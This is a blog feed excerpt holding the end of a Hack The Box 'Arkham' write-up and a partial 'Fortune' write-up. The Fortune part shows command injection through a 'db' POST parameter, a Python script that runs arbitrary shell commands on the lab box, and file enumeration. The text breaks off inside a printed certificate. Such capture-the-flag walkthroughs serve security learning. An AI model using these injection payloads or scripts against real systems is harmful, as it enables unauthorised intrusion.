&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-root-&quot;&gt;We owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---fortune&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/fortune/&quot;&gt;Hack The Box - Fortune&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Web" /><category term="RCE" /><category term="Python" /><category term="Exploit Development" /><category term="smb" /><category term="Cryptography" /><summary type="html">Quick Summary Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is 10.10.10.130, I added it to /etc/hosts as arkham.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC arkham.htb We have http on port 80, 8080 and smb, I checked smb first. SMB Let’s use smbclient to list the shares : ``` root@kali:~/Desktop/HTB/boxes/arkham# smbclient –list //arkham.htb/ -U “” Enter WORKGROUP's password:</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/arkham/0.png" /></entry><entry><title type="html">Hack The Box - Fortune</title><link href="http://localhost:4000/hack-the-box/fortune/" rel="alternate" type="text/html" title="Hack The Box - Fortune" /><published>2019-08-03T00:00:00+02:00</published><updated>2019-08-03T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/fortune</id><content type="html" xml:base="http://localhost:4000/hack-the-box/fortune/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-fortune-retired-and-heres-my-write-up-about-it-it-was-a-very-cool-box-and-i-really-liked-it-like-the-last-retired-box-lacasadepapel-it-had-rce-and-client-certificate-generation-to-access-a-restricted-https-service-but-thats-only-for-the-initial-steps-as-this-box-had-a-lot-of-interesting-stuff-its-an-openbsd-box-and-its-ip-is-101010127-i-added-it-to-etchosts-as-fortunehtb-lets-jump-right-in-&quot;&gt;Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box &lt;a href=&quot;/hack-the-box/lacasadepapel&quot;&gt;LaCasaDePapel&lt;/a&gt; it had &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; and client certificate generation to access a restricted &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.127&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;fortune.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC fortune.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/fortune/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-http-https-on-port-80-port-443-and-we-have-ssh-on-port-22-so-we-will-be-focusing-on-the-web-services&quot;&gt;We have &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 80, port 443 and we have &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22 so we will be focusing on the web services.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;the-index-page-on-httpfortunehtb-is-pretty-simple-we-have-some-options-where-we-can-choose-a-database-of-fortunes-and-we-will-get-a-random-fortune-from-that-database-&quot;&gt;The index page on &lt;code class=&quot;highlighter-rouge&quot;&gt;http://fortune.htb&lt;/code&gt; is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/2.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/fortune/3.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/fortune/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;on-httpsfortunehtb-we-get-a-handshake-error-this-probably-means-that-we-need-a-client-certificate&quot;&gt;On &lt;code class=&quot;highlighter-rouge&quot;&gt;https://fortune.htb&lt;/code&gt; we get a handshake error, this probably means that we need a client certificate.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;rce-client-certificate-generation&quot;&gt;RCE, Client Certificate Generation&lt;/h3&gt;
&lt;h4 id=&quot;back-to-httpfortunehtb-i-intercepted-the-request-with-burp-and-there-was-only-one-parameter-in-the-post-request-called-db-after-trying-some-different-things-i-could-get-rce-by-appending-a-semi-colon--&quot;&gt;Back to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://fortune.htb&lt;/code&gt; I intercepted the request with burp and there was only one parameter in the POST request called &lt;code class=&quot;highlighter-rouge&quot;&gt;db&lt;/code&gt;, after trying some different things I could get &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; by appending a semi-colon &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; :&lt;/h4&gt;
&lt;h4 id=&quot;request-&quot;&gt;Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /select HTTP/1.1
Host: fortune.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://fortune.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Connection: close
Upgrade-Insecure-Requests: 1

db=;pwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=utf-8
Date: Fri, 02 Aug 2019 11:08:49 GMT
Server: OpenBSD httpd
Content-Length: 680

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Your fortune&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'viewport'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'width=device-width, initial-scale=1'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-UA-Compatible&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IE=edge&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Your fortune is:&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&amp;lt;pre&amp;gt;&lt;/span&gt;

Bagbiter:
	1. n.; Equipment or program that fails, usually
intermittently.  2. adj.:  Failing hardware or software.  &lt;span class=&quot;ni&quot;&gt;&amp;amp;#34;&lt;/span&gt;This
bagbiting system won&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;t let me get out of spacewar.&lt;span class=&quot;ni&quot;&gt;&amp;amp;#34;&lt;/span&gt;  Usage:  verges on
obscenity.  Grammatically separable; one may speak of &lt;span class=&quot;ni&quot;&gt;&amp;amp;#34;&lt;/span&gt;biting the
bag&lt;span class=&quot;ni&quot;&gt;&amp;amp;#34;&lt;/span&gt;.  Synonyms: LOSER, LOSING, CRETINOUS, BLETCHEROUS, BARFUCIOUS,
CHOMPER, CHOMPING.
/var/appsrv/fortune


&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&amp;lt;p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Try &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;again&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-couldnt-get-a-reverse-shell-get-ssh-or-read-the-user-flag-so-we-are-going-to-enumerate-the-box-through-this-rce-for-some-time&quot;&gt;I couldn’t get a reverse shell, get &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; or read the user flag so we are going to enumerate the box through this &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; for some time.&lt;/h4&gt;
&lt;h4 id=&quot;i-wrote-a-script-to-make-it-easier-&quot;&gt;I wrote a script to make it easier :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[93m&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;db&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.10.127/select&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rce_result&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rce_result_end&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rfind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;rce&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[?] command : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;;echo rce_result;{};echo rce_result_end&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Result :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-script-takes-the-command-to-execute-then-sends-the-payload-which-is-echo-rce_resultcommandecho-rce_result_end-then-it-searches-through-the-response-and-prints-the-string-between-rce_result-and-rce_result_end-which-is-the-output-of-our-command&quot;&gt;This script takes the command to execute then sends the payload which is &lt;code class=&quot;highlighter-rouge&quot;&gt;;echo rce_result;COMMAND;echo rce_result_end&lt;/code&gt; then it searches through the response and prints the string between &lt;code class=&quot;highlighter-rouge&quot;&gt;rce_result&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rce_result_end&lt;/code&gt; which is the output of our command.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-are-3-users-on-the-box--bob-charlie-and-nfsuser-&quot;&gt;There are 3 users on the box : &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;nfsuser&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : ls -la /home
[*] Result :

total 20
drwxr-xr-x   5 root     wheel    512 Nov  2  2018 .
drwxr-xr-x  13 root     wheel    512 Aug  2 05:47 ..
drwxr-xr-x   5 bob      bob      512 Nov  3  2018 bob
drwxr-x---   3 charlie  charlie  512 Aug  2 06:21 charlie
drwxr-xr-x   2 nfsuser  nfsuser  512 Nov  2  2018 nfsuser
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;in-bobs-home-directory-there-was-a-directory-called-ca-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt;’s home directory there was a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;ca&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : ls -la /home/bob
[*] Result :

total 48
drwxr-xr-x  5 bob   bob    512 Nov  3  2018 .
drwxr-xr-x  5 root  wheel  512 Nov  2  2018 ..
-rw-r--r--  1 bob   bob     87 Oct 11  2018 .Xdefaults
-rw-r--r--  1 bob   bob    771 Oct 11  2018 .cshrc
-rw-r--r--  1 bob   bob    101 Oct 11  2018 .cvsrc
-rw-r--r--  1 bob   bob    359 Oct 11  2018 .login
-rw-r--r--  1 bob   bob    175 Oct 11  2018 .mailrc
-rw-r--r--  1 bob   bob    215 Oct 11  2018 .profile
-rw-------  1 bob   bob     13 Nov  3  2018 .psql_history
drwx------  2 bob   bob    512 Nov  2  2018 .ssh
drwxr-xr-x  7 bob   bob    512 Oct 29  2018 ca
drwxr-xr-x  2 bob   bob    512 Nov  2  2018 dba
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-enumerated-that-directory-for-some-time-and-there-was-a-directory-called-intermediate-where-i-found-a-certificate-and-a-key-&quot;&gt;I enumerated that directory for some time and there was a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;intermediate&lt;/code&gt; where I found a certificate and a key :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : ls -la /home/bob/ca
[*] Result :

total 56
drwxr-xr-x  7 bob  bob   512 Oct 29  2018 .
drwxr-xr-x  5 bob  bob   512 Nov  3  2018 ..
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 certs
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 crl
-rw-r--r--  1 bob  bob   115 Oct 29  2018 index.txt
-rw-r--r--  1 bob  bob    21 Oct 29  2018 index.txt.attr
-rw-r--r--  1 bob  bob     0 Oct 29  2018 index.txt.old
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 intermediate
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 newcerts
-rw-r--r--  1 bob  bob  4200 Oct 29  2018 openssl.cnf
drwx------  2 bob  bob   512 Oct 29  2018 private
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial.old

[?] command : ls -la /home/bob/ca/intermediate
[*] Result :

total 60
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 .
drwxr-xr-x  7 bob  bob   512 Oct 29  2018 ..
drwxr-xr-x  2 bob  bob   512 Nov  3  2018 certs
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 crl
-rw-r--r--  1 bob  bob     5 Oct 29  2018 crlnumber
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 csr
-rw-r--r--  1 bob  bob   107 Oct 29  2018 index.txt
-rw-r--r--  1 bob  bob    21 Oct 29  2018 index.txt.attr
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 newcerts
-rw-r--r--  1 bob  bob  4328 Oct 29  2018 openssl.cnf
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 private
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial.old

[?] command : ls -la /home/bob/ca/intermediate/certs
[*] Result :

total 32
drwxr-xr-x  2 bob  bob   512 Nov  3  2018 .
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
-r--r--r--  1 bob  bob  4114 Oct 29  2018 ca-chain.cert.pem
-r--r--r--  1 bob  bob  1996 Oct 29  2018 fortune.htb.cert.pem
-r--r--r--  1 bob  bob  2061 Oct 29  2018 intermediate.cert.pem

[?] command : ls -la /home/bob/ca/intermediate/private
[*] Result :

total 20
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 .
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
-r--------  1 bob  bob  1675 Oct 29  2018 fortune.htb.key.pem
-rw-r--r--  1 bob  bob  3243 Oct 29  2018 intermediate.key.pem

[?] command : cat /home/bob/ca/intermediate/certs/intermediate.cert.pem
[*] Result :

-----BEGIN CERTIFICATE-----                           
MIIFxDCCA6ygAwIBAgICEAAwDQYJKoZIhvcNAQELBQAwbTELMAkGA1UEBhMCQ0Ex
CzAJBgNVBAgMAk9OMRcwFQYDVQQKDA5Gb3J0dW5lIENvIEhUQjEYMBYGA1UEAwwP
Rm9ydHVuZSBSb290IENBMR4wHAYJKoZIhvcNAQkBFg9ib2JAZm9ydHVuZS5odGIw
HhcNMTgxMDMwMDA1NjQzWhcNMjgxMDI3MDA1NjQzWjB1MQswCQYDVQQGEwJDQTEL
MAkGA1UECAwCT04xFzAVBgNVBAoMDkZvcnR1bmUgQ28gSFRCMSAwHgYDVQQDDBdG
b3J0dW5lIEludGVybWVkaWF0ZSBDQTEeMBwGCSqGSIb3DQEJARYPYm9iQGZvcnR1
bmUuaHRiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAuTGpzUbl4RIy
DuJv8S36vZm96P8FoUgseznDqNOqAEN+qU6NTzZAjOvCAJu7tiJjnvrUxf4SzuLR
QEsU99R6UDBj/rz1dMRq3P/7VdbNC5o2zrd99fN/MDz288Rv7Z24LKWvPoEFWU5D
SpQo+lregWcl4yzTS0hHQjjk/aGPPkLFhT1oW/kbz9205JT1LvR+mqNWbH/0Q92K
7Ns3b2UqEdvD0nm/t7SAphhkGYEtsxyEdiI97sB6jXxlgHzblwFlQaHvh6H7u6rC
m/VGQDFmY3d/zA1TtZ0vuAJ2/EEs0NU6XySL6YmfIsPJdu4NoeEeXofqwQjNf2bs
jgQZrOujLxTBo1L4cFsNvZVwwNscyr+wZM/SybEGB3vBe4e+wvzkT7YD4lqubvXZ
O346jKcnOF/lviF6HmxhUL5pac4XHNYPJhVoKmimYUWi2fJ/1B2PgRrzv/mmlgL7
JOpJNWMUbc8bEf698QziuCXj5R/+Lover058nrvCAnI4I4wUHTGAgOC1J4hbVoYX
EjK1GT+zlnX9+JAqGthxxqQp/YXYk1lgA5xpANJIlxH0gwaTQ4a8HAPBliHnEV0v
XK38+yzRe1/uD3OUWKw+DYD/EmH78QiAr7Yb7K4H1yh5VF9zkLCTN6WYoaSM1Z0T
nb8nv8SUuSwsa/piZvRo7VqzYbDtl8MCAwEAAaNmMGQwHQYDVR0OBBYEFNBS/hId
Md8NPcYbC32/OSwFbZzUMB8GA1UdIwQYMBaAFFOdNrSGE+IcSQJs1UTIogSJ2i5W
MBIGA1UdEwEB/wQIMAYBAf8CAQAwDgYDVR0PAQH/BAQDAgGGMA0GCSqGSIb3DQEB
CwUAA4ICAQAJ0/abFm23OqxhuRPiGr7VfRn8DbsyQ7oVB8zxJsgfgWkXTKuTtJti
zhZSFR8/JMUYhRLwdkjf8w3hA7GKF9VS3kioEDGROtx++ZQc1ljI7owLfDYfhQ08
